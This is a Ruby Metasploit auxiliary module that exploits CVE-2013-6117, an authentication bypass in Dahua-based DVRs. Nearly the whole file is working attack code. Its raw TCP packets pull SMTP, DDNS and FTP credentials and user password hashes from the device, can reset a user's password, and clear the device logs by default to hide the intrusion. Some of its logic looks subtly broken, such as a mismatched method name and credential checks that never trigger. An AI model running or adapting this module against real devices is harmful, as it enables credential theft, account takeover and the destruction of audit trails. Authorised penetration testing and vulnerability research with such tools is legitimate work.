class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'            => %q(Dahua DVR Auth Bypass Scanner),
      'Description'     => %q(Scans for Dahua-based DVRs and then grabs settings. Optionally resets a user's password and clears the device logs),
      'Author'          => [
        'Jake Reynolds - Depth Security', # Vulnerability Discoverer
        'Tyler Bennett - Talos Infosec' # Metasploit Module
      ],
      'References'      => [
        [ 'CVE', '2013-6117' ],
        [ 'URL', 'https://depthsecurity.com/blog/dahua-dvr-authentication-bypass-cve-2013-6117' ]
      ],
      'License'         => MSF_LICENSE
       )
    deregister_options('RHOST')
    register_options([
      OptString.new('USERNAME', [false, 'A username to reset', '888888']),
      OptString.new('PASSWORD', [false, 'A password to reset the user with']),
      OptBool.new('RESET', [true, 'Reset an existing user\'s pw?', 'FALSE']),
      OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs when we\'re done?', 'TRUE']),
      Opt::RPORT(37777)
    ])
  end

  def setup
    @password = datastore['PASSWORD']
    @password ||= Rex::Text.rand_text_alpha(6)
  end

  def run_host(ip)
    usercount = 0
    u1 = "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    dvr_resp = "\xb1\x00\x00\x58\x00\x00\x00\x00"
    version = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    email = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
            "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    ddns = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
           "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    nas = "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" \
          "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    channels = "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
               "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" \
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    groups = "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    users = "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    sn = "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" \
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    clear_logs = "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" \
                 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" \
                  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    user = "root"
    pass = " w"
    # user8pwhash = "4WzwxXxM" #888888
    # user6pwhash = "sh15yfFM" #666666
    # useradminpwhash = "6QNMIQGe" #admin
    connect
    sock.put(u1)
    data = sock.recv(8)
    disconnect
    if data == dvr_resp
      print_good("DVR FOUND: @ #{rhost}:#{rport}!")
      report_service(host: rhost, port: rport, sname: 'dvr', info: "Dahua-based DVR")
      connect
      sock.put(version)
      data = sock.get(1024)
      if data =~ /[\x00]{8,}([[:print:]]+)/
        ver = Regexp.last_match[1]
        print_status("Version: #{ver} @ #{rhost}:#{rport}!")
      end

      sock.put(sn)
      data = sock.get(1024)
      if data =~ /[\x00]{8,}([[:print:]]+)/
        serial = Regexp.last_match[1]
        print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
      end
      connect
      sock.put(email)
      if data = sock.get(1024).split('&&')
        print_status("Email Settings: @ #{rhost}:#{rport}!")
        if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
          if mailhost = Regexp.last_match[1].split(':')
            print_status("	Server: #{mailhost[0]}") unless mailhost[0].nil?
            print_status("	Destination Email: #{data[1]}") unless mailhost[1].nil?
          end
          if !data[5].nil? && !data[6].nil?
            print_good("	SMTP User: #{data[5]}") unless data[5].nil?
            print_good("	SMTP Password: #{data[6]}") unless data[6].nil?
            muser = "#{data[5]}"
            mpass = "#{data[6]}"
            mailserver = "#{mailhost[0]}"
            print_good("MailServer: #{mailserver}")
            if !mailserver.to_s.strip.length == 0 && !muser.to_s.strip.length == 0 && !mpass.to_s.strip.length == 0
              report_email_creds(mailserver, rport, muser, mpass) if !mailserver.nil? && !muser.nil? && !mpass.nil?
            end
          end
        end
      end
      connect
      sock.put(ddns)
      if data = sock.get(1024)
        data = data.split(/&&[0-1]&&/)
        data.each_with_index do |val, index|
          if index > 0
            val = val.split("&&")
            ddns_service = "#{val[0]}"
            ddns_server = "#{val[1]}"
            ddns_port = "#{val[2]}"
            ddns_domain = "#{val[3]}"
            ddns_user = "#{val[4]}"
            ddns_pass = "#{val[5]}"
            print_status("DDNS Settings @ #{rhost}:#{rport}!:")
            print_status("	DDNS Service: #{ddns_service}") unless val.nil?
            print_status("	DDNS Server:  #{ddns_server}") unless val.nil?
            print_status("	DDNS Port: #{ddns_port}") unless val.nil?
            print_status("	Domain: #{ddns_domain}") unless val.nil?
            print_good("	Username: #{ddns_user}") unless val.nil?
            print_good("	Password: #{ddns_pass}") unless val.nil?
            if !ddns_server.to_s.strip.length == 0 && !ddns_port.to_s.strip.length == 0 && !ddns_user.to_s.strip.length == 0 && !ddns_pass.to_s.strip.length == 0

              report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
            end
          end
        end
      end
      connect
      sock.put(nas)
      if data = sock.get(1024)
        print_status("Nas Settings @ #{rhost}:#{rport}!:")
        server = ''
        port = ''
        if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
          server = Regexp.last_match[1].unpack('C*').join('.')
          port = Regexp.last_match[2].unpack('S')
          print_status("	Nas Server #{server}")
          print_status("	Nas Port: #{port}")
        end
        if data =~ /[\x00]{16,}([[:print:]]+)[\x00]{16,}([[:print:]]+)/
          ftpuser = Regexp.last_match[1]
          ftppass = Regexp.last_match[2]
          print_good("	FTP User: #{ftpuser}")
          print_good("	FTP Password: #{ftppass}")
          if !ftpuser.to_s.strip.length == 0 && ftppass.to_s.strip.length == 0
            report_creds(host: server, port: port, user: ftpuser, pass: ftppass, type: "FTP",
                         active: true) if !server.nil? && !port.nil? && !ftpuser.nil? && !ftppass.nil?
          end
        end
      end
      connect
      sock.put(channels)
      data = sock.get(1024).split('&&')
      disconnect
      if data.length > 1
        print_status("Camera Channels @ #{rhost}:#{rport}!:")
        data.each_with_index { |val, index| print_status("	#{index + 1}:#{val[/([[:print:]]+)/]}") }
      end
      connect
      sock.put(users)
      if data = sock.get(1024).split('&&')
        print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
        data.each do |val|
          usercount += 1
          pass = "#{val[/(([\d]+)[:]([0-9A-Za-z]+)[:]([0-9A-Za-z]+))/]}"
          value = pass.split(":")
          username = "#{value[1]}"
          md5hash = "#{value[2]}"
          print_status("	#{val[/(([\d]+)[:]([[:print:]]+))/]}")
          # Write the dahua hash to the database
          hash = "#{rhost} #{username}:$dahua$#{md5hash}"
          report_hash(ip, rport, user, hash)
          # Write the vulnerability to the database
          report_vuln(
            host: rhost,
            port: rport,
            proto: 'tcp',
            sname: 'dvr',
            name: 'Dahua Authentication Password Hash Exposure',
            info: "Obtained password hash for user #{username}: #{md5hash}",
            refs: references
          )
        end
      end
      connect
      sock.put(groups)
      if data = sock.get(1024).split('&&')
        print_status("User Groups: @ #{rhost}:#{rport}!")
        data.each { |val| print_status("	#{val[/(([\d]+)[:]([\w]+))/]}") }
      end
      if datastore['RESET']
        userstring = datastore['USERNAME'] + ":Intel:" + @password + ":" + @password
        u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + userstring
        sock.put(u1)
        sock.put(u2)
        sock.put(u3)
        data = sock.get(1024)
        sock.put(u1)
        if data = sock.get(1024)
          print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
        end

      end

      if datastore['CLEAR_LOGS']
        sock.put(clear_logs)
        sock.put(clear_logs2)
        print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
      end
      disconnect
    end
  end

  def report_hash(ip, rport, user, hash)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'dahua_dvr',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: 'dahua_hash',
      username: user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_ddns_cred(ddns_server, ddns_port, ddns_user, ddns_pass)
    service_data = {
      address: ddns_server,
      port: ddns_port,
      service_name: 'ddns settings',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: ddns_pass,
      private_type: :password,
      username: ddns_user
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def report_email_cred(mailserver, rport, muser, mpass)
    service_data = {
      address: mailserver,
      port: rport,
      service_name: 'email settings',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: mpass,
      private_type: :password,
      username: muser
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
